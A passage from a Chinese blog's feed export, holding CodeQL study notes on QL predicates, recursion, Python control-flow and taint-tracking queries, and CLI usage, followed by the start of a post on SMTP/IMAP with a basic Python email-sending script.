isAllowdIn (string region)，表示孩子只能在自己的地盘走动，表达式为 region = this.getLocation ()</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Child extends Person &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 特征谓词 */</span></span><br><span class=\"line\">  Child() &#123;this.getAge() &lt; 10&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/* 成员谓词 */</span></span><br><span class=\"line\">  override predicate isAllowedIn(string region) &#123;</span><br><span class=\"line\">    region <span class=\"operator\">=</span> this.getLocation()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>操作的传递闭包</strong></p>\n<p>同一个操作被应用多次，被称为操作的传递闭包。在处理传递闭包时，有两个特殊的符号极其有用，即 + 和 *</p>\n<ul>\n<li><code>parentOf+(p)</code> ，对变量 p 应用一次或多次谓词</li>\n<li><code>parentOf*(p)</code> ，对变量 p 应用零次或者多次谓词 parentOf ()</li>\n</ul>\n<h1 id=\"深入了解递归\"><a class=\"markdownIt-Anchor\" href=\"#深入了解递归\">#</a> 深入了解递归</h1>\n<p>QL 语言中，如果谓词直接或者间接地调用了自身，称其为递归型谓词</p>\n<p>为了求解递归谓词的返回值的集合，QL 编译器需要寻找递归的不动点，从空集开始，重复应用谓词，直到集合不发生变化，此时集合称为最小不动点。</p>\n<p>求 0-100 之间的整数递归型谓词</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int getANumber() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">=</span> <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">or</span> </span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">&lt;=</span> <span class=\"number\">100</span> <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> getANumber() <span class=\"operator\">+</span> <span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> getANumber()</span><br></pre></td></tr></table></figure>\n<p>求解该谓词，会得到 0-100 的集合</p>\n<p><strong>相互递归</strong></p>\n<p>递归型谓词除了调用自身外，也可以互相调用，形成一个循环</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int getAEven() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">=</span> <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">or</span> </span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">&lt;=</span> <span class=\"number\">100</span> <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> getAnOdd() <span class=\"operator\">+</span> <span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int getAnOdd() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">=</span> getAEven</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> getAnEven()</span><br></pre></td></tr></table></figure>\n<h1 id=\"python\"><a class=\"markdownIt-Anchor\" href=\"#python\">#</a> Python</h1>\n<p><strong>变量</strong></p>\n<p>Python 源代码中的变量可用 CodeQL 库中的 Variable 类来表示，该类有两个子类，LocalVariable 表示函数和类级别的变量，子类 GlobalVariable 用于表示模块级别的变量</p>\n<p><strong>控制流分析</strong></p>\n<p>每个作用域类（Class，Function，Module）都包含了一个由 ControlFlowNode 构成的图，每个作用域都有一个入口点和至少一个的出口点。为了提高分析控制流和数据流的速度，控制流节点会被分组为基本构造块。一个基本块就是一个没有任何分支的代码序列。</p>\n<p>AST 节点和控制流节点存在一对多的关系。</p>\n<p><strong>查找针对特定函数的调用</strong></p>\n<p>通过 Call 和 Name 两个类，查找对函数 eval 的调用</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"keyword\">Call</span> <span class=\"keyword\">call</span>, Name name</span><br><span class=\"line\"><span class=\"keyword\">where</span> call.getFunc() <span class=\"operator\">=</span> name <span class=\"keyword\">and</span> name.getId() <span class=\"operator\">=</span> &quot;eval&quot;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">call</span>, &quot;call to &#x27;eval&#x27;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"语句和表达式分析\"><a class=\"markdownIt-Anchor\" href=\"#语句和表达式分析\">#</a> 语句和表达式分析</h2>\n<p><strong>语句</strong></p>\n<p>对于 Python 中各种类型的语句，CodeQL 都提供了相应的类加以表示</p>\n<p>Stmt 类 —— 语句</p>\n<ul>\n<li>\n<p>Assert 类 —— assert 语句</p>\n</li>\n<li>\n<p>Assign 类</p>\n</li>\n<li>\n<p>AssignStmt 类 —— 赋值语句，如 x = y</p>\n</li>\n<li>\n<p>ClassDef —— 类定义语句</p>\n</li>\n<li>\n<p>FunctionDef —— 函数定义语句</p>\n</li>\n<li>\n<p>AugAssign —— 增量赋值 (augmented assignment) 语句，如 x += y</p>\n</li>\n<li>\n<p>Break 类 —— break 语句</p>\n</li>\n<li>\n<p>Continue 类 —— continue 语句</p>\n</li>\n<li>\n<p>Delete 类 —— del 语句</p>\n</li>\n<li>\n<p>ExceptStmt 类 —— try 语句的 except 部分</p>\n</li>\n<li>\n<p>Exec 类 —— exec 语句</p>\n</li>\n<li>\n<p>For 类 —— for 语句</p>\n</li>\n<li>\n<p>Global 类 —— global 语句</p>\n</li>\n<li>\n<p>If 类 —— if 语句</p>\n</li>\n<li>\n<p>ImportStar 类 —— from xxx import * 语句</p>\n</li>\n<li>\n<p>Import 类 —— 其他类型的 import 语句</p>\n</li>\n<li>\n<p>Nonlocal 类 —— nonlocal 语句</p>\n</li>\n<li>\n<p>Pass 类 —— pass 语句</p>\n</li>\n<li>\n<p>Print 类 —— print 语句 (仅限于 python 2 版本)</p>\n</li>\n<li>\n<p>Raise 类 —— raise 语句</p>\n</li>\n<li>\n<p>Return 类 —— return 语句</p>\n</li>\n<li>\n<p>Try 类 —— try 语句</p>\n</li>\n<li>\n<p>While 类 —— while 语句</p>\n</li>\n<li>\n<p>With 类 —— with 语句</p>\n</li>\n</ul>\n<p><strong>表达式</strong></p>\n<p>对于 Python 中各种类型的表达式，CodeQL 都提供了相应的类来加以表示。</p>\n<p>Expr 类 —— 表达式</p>\n<ul>\n<li>\n<p>Attribute —— 属性，例如 obj.attr</p>\n</li>\n<li>\n<p>BinaryExpr —— 二进制运算，例如 x+y</p>\n</li>\n<li>\n<p>BoolExpr —— Short circuit logical operations， 例如 x and y, x or y</p>\n</li>\n<li>\n<p>Bytes —— 字节，例如 b&quot;x&quot;</p>\n</li>\n<li>\n<p>Call —— 函数调用，例如 f (arg)</p>\n</li>\n<li>\n<p>Compare —— 比较运算，0&lt;x&lt;10</p>\n</li>\n<li A:=\"\" 2=\"\">\n<p>Dict —— 字典，例如</p>\n</li>\n<li k:=\"\" v=\"\" for=\"\" css-module=\".\">\n<p>DictComp 类 —— 字典推导式，如</p>\n</li>\n<li>\n<p>Ellipsis 类 —— 省略号表达式，如…</p>\n</li>\n<li>\n<p>GeneratorExp 类 —— 生成器表达式</p>\n</li>\n<li>\n<p>IfExp 类 —— 条件表达式，如 x if cond else y</p>\n</li>\n<li>\n<p>ImportExpr 类 —— 表示导入模块的表达式</p>\n</li>\n<li>\n<p>ImportMember 类 —— 表示从模块导入某些成员的表达式（from xxx import * 语句的一部分）</p>\n</li>\n<li>\n<p>Lambda 类 —— Lambda 表达式</p>\n</li>\n<li>\n<p>List 类 —— 列表，如 [‘a’, ‘b’]</p>\n</li>\n<li>\n<p>ListComp 类 —— 列表推导式，如 [x for …]</p>\n</li>\n<li>\n<p>Name 类 —— 对变量 var 的引用</p>\n</li>\n<li>\n<p>Num 类 —— 数字，如 3 或 4.2</p>\n</li>\n<li>\n<p>Floatliteral</p>\n</li>\n<li>\n<p>ImaginaryLiteral 类</p>\n</li>\n<li>\n<p>IntegerLiteral 类</p>\n</li>\n<li>\n<p>Repr 类 —— 反引号表达</p>\n</li>\n<li a,=\"\" b=\"\">\n<p>Set 类 —— 集合，如</p>\n</li>\n<li x=\"\" for=\"\" css-module=\".\">\n<p>SetComp 类 —— 集合推导式，如</p>\n</li>\n<li>\n<p>Slice 类 —— 切片；如表达式 seq [0:1] 中的 0:1</p>\n</li>\n<li>\n<p>Starred 类 —— 星号表达式，如 y, *x = 1,2,3（仅限于 Python 3）</p>\n</li>\n<li>\n<p>StrConst 类 —— 字符串。 在 Python2 中，可以是字节或 Unicode 字符。 在 Python3 中，只能是 Unicode 字符。</p>\n</li>\n<li>\n<p>Subscript 类 —— 下标运算，如 seq [index]</p>\n</li>\n<li>\n<p>UnaryExpr 类 —— 一元运算，如 - x</p>\n</li>\n<li>\n<p>Unicode 类 —— Unicode 字符，如 u&quot;x&quot; 或（Python 3 中的）“x”</p>\n</li>\n<li>\n<p>Yield 类 —— yield 表达式</p>\n</li>\n<li>\n<p>YieldFrom 类 —— yield from 表达式（Python 3.3+)</p>\n</li>\n</ul>\n<h2 id=\"控制流分析\"><a class=\"markdownIt-Anchor\" href=\"#控制流分析\">#</a> 控制流分析</h2>\n<p><strong>ControlFlowNode 类</strong></p>\n<p>抽象语法树节点和控制流节点存在一对多的关系，每个语法元素，即 AstNode 类，可以映射到零个、一个或多个 ControlFlowNode 类，每个 ControlFlowNode 类只映射到一个 AstNode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    might_raise()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cond:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"keyword\">finally</span>:</span><br><span class=\"line\">    close_resource()</span><br></pre></td></tr></table></figure>\n<p>访问 close_resource () 的路径有三条，一正常执行，二引发 might_raise，三 break</p>\n<p>查找不可达语句，每条通过 AstNode 的路径都有一个 ControlFlowNode，所以所有不可达的 AstNode 都没有通过 ControlFlowNode 的路径，因此没有 ControlFlowNode 的 AstNode 是不可达的</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> AstNode node</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">not</span> <span class=\"keyword\">exists</span>(node.getAFlowNode())</span><br><span class=\"line\"><span class=\"keyword\">select</span> node</span><br></pre></td></tr></table></figure>\n<p>执行上述代码可能会得到大量返回结果，因为 Module 类是 AstNode 的子类，所以查询结果中包含用 C 语言实现的模块以及不包含源代码的模块。所以，最好还是由查找不可达 AstNode 转换为查找不可达语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Stmt s</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">not</span> <span class=\"keyword\">exists</span>(s.getAFlowNode())</span><br><span class=\"line\"><span class=\"keyword\">select</span> s</span><br></pre></td></tr></table></figure>\n<h3 id=\"污点跟踪和数据流分析\"><a class=\"markdownIt-Anchor\" href=\"#污点跟踪和数据流分析\">#</a> 污点跟踪和数据流分析</h3>\n<p>污点跟踪库位于 TaintTracking 模块中，另外，用于污点跟踪和数据流分析的所有查询都有三个显式组件（其中一个是可选的），以及一个隐式组件。显式组件包括</p>\n<ol>\n<li>一个或多个可能存在不安全数据的源点，它们由 TaintTracking::Source 类表示。</li>\n<li>由 TaintTracking::Sink 类表示的一个或多个数据或污点可能流向的接收点。</li>\n<li>零个或多个清洗器，由 Sanitizer 类表示。</li>\n</ol>\n<p>在数据从源点流向接收点的过程中，如果没有遭到清洗器的拦截的话，用于污点跟踪或数据流分析的查询就会返回相应的分析结果。</p>\n<p>这三个组件是通过 TaintTracking::Configuration 绑定在一起的，以便明确特定查询与哪些源点和接收点相关。</p>\n<p>最后一个隐式组件是污点的 “kind”，由 TaintKind 类表示。污点的类型决定了，除了执行内置的、针对 “保留值” 的处理之外，还执行哪些针对 “非保留值” 的分析步骤。例如，对于上面讲过的 dir = path + “/”，当污点表示字符串的时候，则污点数据会从 path 流向 dir，但如果污点为 None 的话，则不会出现这种情况。</p>\n<p><strong>查询所有对于 eval 函数的调用</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\">from Call call, Name name</span><br><span class=\"line\">where call.getFunc() &#x3D; name and name.getId() &#x3D; &quot;eval&quot;</span><br><span class=\"line\">select call, &quot;call to &#39;eval&#39;&quot;</span><br></pre></td></tr></table></figure>\n<p>上面查询存在两个问题</p>\n<ol>\n<li>对于所有名为’eval’的调用都会被视为内置函数 eval 的调用，导致假阳性</li>\n<li>其假设 eval 不能被其他名称引用，导致假阴性</li>\n</ol>\n<p>改进 —— 通过谓词 Value::named 来准确识别 eval 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Name name</span><br><span class=\"line\"><span class=\"keyword\">where</span> name <span class=\"operator\">=</span> <span class=\"keyword\">Value</span>::named(<span class=\"string\">&#x27;eval&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">select</span> name</span><br></pre></td></tr></table></figure>\n<p>准确识别 eval 函数后，通过 Value.getACall () 来识别对 eval 函数的调用</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import python</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> ControlFlowNode <span class=\"keyword\">call</span>, <span class=\"keyword\">Value</span> val</span><br><span class=\"line\"><span class=\"keyword\">where</span> eval <span class=\"operator\">=</span> <span class=\"keyword\">Value</span>::named(<span class=\"string\">&#x27;eval&#x27;</span>) <span class=\"keyword\">and</span> </span><br><span class=\"line\">    <span class=\"keyword\">call</span> <span class=\"operator\">=</span> eval.getACall()</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">call</span>, &quot;call to &#x27;eval&#x27;&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"使用vscode-配置codeql工作区\"><a class=\"markdownIt-Anchor\" href=\"#使用vscode-配置codeql工作区\">#</a> 使用 VSCode 配置 CodeQL 工作区</h1>\n<h2 id=\"使用starter工作区\"><a class=\"markdownIt-Anchor\" href=\"#使用starter工作区\">#</a> 使用 &quot;starter&quot; 工作区</h2>\n<p>&quot;starter&quot; 工作区实际上是一个 Git 存储库，包含如下内容</p>\n<ul>\n<li>用于存放分析 Python 代码的 CodeQL 库和查询的存储库</li>\n</ul>\n<h2 id=\"编写路径查询\"><a class=\"markdownIt-Anchor\" href=\"#编写路径查询\">#</a> 编写路径查询</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">*...</span></span><br><span class=\"line\"><span class=\"comment\">*@kind path-problem</span></span><br><span class=\"line\"><span class=\"comment\">*...</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">import python</span><br><span class=\"line\">import semmle.python.security.Paths</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> TaintedPathSource source, TaintedPathSink sink</span><br><span class=\"line\"><span class=\"keyword\">where</span> source.flowsTo(sink)</span><br><span class=\"line\"><span class=\"keyword\">select</span> sink.getNode(), source, sink, <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>Paths 从标准 CodeQL 库中导入的路径图模块</li>\n<li>source，sink 为路径图中的节点</li>\n</ul>\n<p><strong>路径查询元数据</strong></p>\n<p>其必须包含属性 @kind path-problem，以确保查询结果可以正确解释和显示</p>\n<p><strong>生成路径解释</strong></p>\n<p>为了生成路径解释，我们的查询需要计算路径图。因此，我们需要定一个谓词 edges，用于计算与查询生成结果相关的谓词。从标准库导入预定义的 edges 谓词</p>\n<p>Python</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import semmle.python.security.Paths</span><br></pre></td></tr></table></figure>\n<p>自定义谓词</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query predicate edges(PathNode a, PathNode b)&#123;</span><br><span class=\"line\"><span class=\"comment\">/** Logical conditions which hold if `(a,b)` is an edge in the data flow graph */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>定义流动条件</strong></p>\n<p>在编写路径查询时，通常包含一个谓词，该谓词仅在数据从源点流向接收点时成立</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">where</span> source.flowsTo(sink)</span><br></pre></td></tr></table></figure>\n<h1 id=\"codeql-cli\"><a class=\"markdownIt-Anchor\" href=\"#codeql-cli\">#</a> CodeQL CLI</h1>\n<h2 id=\"创建codeql数据库\"><a class=\"markdownIt-Anchor\" href=\"#创建codeql数据库\">#</a> 创建 CodeQL 数据库</h2>\n<p><strong>执行 codeql database create</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database <span class=\"keyword\">create</span> [database<span class=\"operator\">-</span>path] <span class=\"comment\">--language python --source-root ./demo-root</span></span><br></pre></td></tr></table></figure>\n<p>其中，必须指定</p>\n<ul>\n<li>\n<p>–language: 为其创建数据库的语言的标识符。CodeQL 支持为以下语言创建数据库</p>\n<table>\n<thead>\n<tr>\n<th>语言</th>\n<th>标识符</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>C/C++</td>\n<td>cpp</td>\n</tr>\n<tr>\n<td>C#</td>\n<td>csharp</td>\n</tr>\n<tr>\n<td>Go</td>\n<td>go</td>\n</tr>\n<tr>\n<td>Java</td>\n<td>java</td>\n</tr>\n<tr>\n<td>JavaScript/TypeScript</td>\n<td>javascript</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>python</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>–source-root： 用于创建数据库的源文件的根目录。默认情况会将当前目录认为是源文件的根目录</p>\n</li>\n</ul>\n<h2 id=\"使用codeql-cli分析数据库\"><a class=\"markdownIt-Anchor\" href=\"#使用codeql-cli分析数据库\">#</a> 使用 CodeQL CLI 分析数据库</h2>\n<p>实际利用 CodeQL 分析代码的过程，就是在从代码中提取的数据库上运行查询的过程。</p>\n<p><strong>运行查询</strong></p>\n<ul>\n<li>\n<p>database analyze</p>\n</li>\n<li>\n<p>database run-queries  —— 该命令将以中间二进制格式（通常为 BQRS 格式）输出非解释型结果</p>\n</li>\n<li>\n<p>query run —— 该命令既可以输出 BQRS 格式的文件，也可以将结果直接输出至命令行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql query run ./query.ql --databse=./demo-query --output=./result.bqrs </span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>解码 bqrs</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql bqrs decode [--output=&lt;file&gt;] [--result-set=&lt;name&gt;] [--sort-key=&lt;col&gt;[,&lt;col&gt;...]] &lt;options&gt;... -- &lt;file&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>codeql database analyze</strong></p>\n<p>运行 database analyze 命令时，其完成下述工作</p>\n<ol>\n<li>运行一个或多个查询文件，在 CodeQL 数据库上运行相应的查询代码</li>\n<li>根据某些查询元数据来解释结果，以便在源代码中相应位置显示警示信息</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database analyze --format=csv --output=./path</span><br></pre></td></tr></table></figure>\n<ul>\n<li>–format —— 分析过程中生成的结果文件的格式</li>\n<li>–output —— 分析过程中生成的结果文件输出路径</li>\n</ul>\n<p><strong>使用自定义查询</strong></p>\n<ol>\n<li>\n<p>编写有效查询，并将其保存到扩展名为.ql 的文件中</p>\n</li>\n<li>\n<p>提供查询元数据</p>\n<p>查询元数据通常位于每个查询文件的顶部，其作用时向用户提供有关该查询的说明信息，并告诉 CodeQL 如何处理查询结果</p>\n<p>必须提供的两个属性</p>\n<ul>\n<li>查询标识符 （@id）： 由小写字母和数字组成的单词序列，用 “/” 或 &quot;-&quot; 作为分隔符，用于对查询进行标识和分类</li>\n<li>查询类型（@kind）：用以表示查询结果时警报（@kind problem）还是路径（@kind path-problem）</li>\n</ul>\n</li>\n</ol>\n<p><strong>创建自定义 QL 包</strong></p>\n<p>编写自定义的查询代码时，应将其保存在自定义的 QL 包目录中。QL 包提供了一种组织 CodeQL 分析过程中所用文件的方法。自定义 QL 包目录下必须提供一个名为 <code>qlback.yml</code>  文件。</p>\n<p><code>qlback.yml</code>  文件用于告诉 CodeQL 如下信息：如何编译相应的查询代码，这个包依赖哪些库，在哪里找到查询套件信息。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZWxwLnNlbW1sZS5jb20vY29kZXFsL2NvZGVxbC1jbGkvcmVmZXJlbmNlL3FscGFjay1vdmVydmlldy5odG1sI3FscGFjay15bWw=\">https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html#qlpack-yml</span></p>\n<ul>\n<li>\n<p><strong>Q1:</strong> VSCode 中可以执行得到结果，命令行中执行 codeql query run 无法得到结果？</p>\n<p><strong>A:</strong> 在 VSCode 使用了工作区，所以执行查询时会自动在工作区目录下检索 ql 文件中导入的第三方库。而命令行执行时，ql 文件所在位置则无法检索到相应的第三方库。目前做法，把 ql 文件放在 VSCode-CodeQL-starter (工作区) 的 codeql-custom-queries-python/ 目录下</p>\n<p>后续改进可以打包相关第三方库，这个方式还需要学习</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vemgvY29kZS1zZWN1cml0eS9jb2RlcWwtY2xpL2NvZGVxbC1jbGktbWFudWFsL3BhY2stcGFja2xpc3Q=\">https://docs.github.com/zh/code-security/codeql-cli/codeql-cli-manual/pack-packlist</span></p>\n</li>\n</ul>\n<h2 id=\"更新codeql数据库\"><a class=\"markdownIt-Anchor\" href=\"#更新codeql数据库\">#</a> 更新 CodeQL 数据库</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">codeql database upgrade</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "codeql"
            ]
        },
        {
            "id": "https://snowroll.github.io/email/",
            "url": "https://snowroll.github.io/email/",
            "title": "邮件发送脚本",
            "date_published": "2023-07-11T12:00:00.000Z",
            "content_html": "<h1 id=\"背景知识\"><a class=\"markdownIt-Anchor\" href=\"#背景知识\">#</a> 背景知识</h1>\n<ul>\n<li>\n<p>SMTP</p>\n<p>Simple Mail Transfer Protocol（SMTP） ，简单邮件传输协议，其是一种 TCP/IP 协议，用于发送电子邮件。大多数邮箱都是使用 SMTP，例如 Gmail、Outlook、AppleMail、163 等。SMTP 服务器一般使用 25 端口来发送电子邮件。</p>\n<p><strong>发送过程：</strong></p>\n<ul>\n<li>邮件服务器利用 SMTP 将消息从邮件客户端发送到另一个电子邮件服务器</li>\n<li>邮件服务器利用 SMTP 作为中继，转发电子邮件到其接收的电子邮件服务器</li>\n<li>接收邮件服务器使用邮件客户端通过 IMAP 下载传入的邮件，并将其放入收件人邮箱</li>\n</ul>\n</li>\n<li>\n<p>IMAP</p>\n<p>Internet Message Access Protocol（IMAP），交互式网络存储协议，用于管理和检索电子邮件，并在不同设备之间同步。邮件客户端（例如手机端或者网页端邮箱）可以通过这种协议从邮件服务器中获取并下载邮件信息，不同客户端的邮件状态会保持一致。</p>\n<p>可以理解为所有的邮件都保存在邮件服务器中，而 IMAP 作为一个中介，让邮件客户端可以读取服务器中的邮件。这也是邮件附件如果短时间不下载，会被清除的原因。因为电子邮件并未在本地保存。</p>\n</li>\n</ul>\n<h1 id=\"发送脚本\"><a class=\"markdownIt-Anchor\" href=\"#发送脚本\">#</a> 发送脚本</h1>\n<p>一个简单的发邮件脚本，修改一下，可以实现批量脚本发送。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> smtplib</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.mime.multipart <span class=\"keyword\">import</span> MIMEMultipart</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个 MIMEMultipart 对象</span></span><br><span class=\"line\">msg = MIMEMultipart()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置邮件的头部信息</span></span><br><span class=\"line\">msg[<span class=\"string\">&#x27;From&#x27;</span>] = <span class=\"string\">&#x27;your_email&#x27;</span></span><br><span class=\"line\">msg[<span class=\"string\">&#x27;To&#x27;</span>] = <span class=\"string\">&#x27;receiver_email&#x27;</span></span><br><span class=\"line\">msg[<span class=\"string\">&#x27;Subject&#x27;</span>] = <span class=\"string\">&#x27;Subject: Test 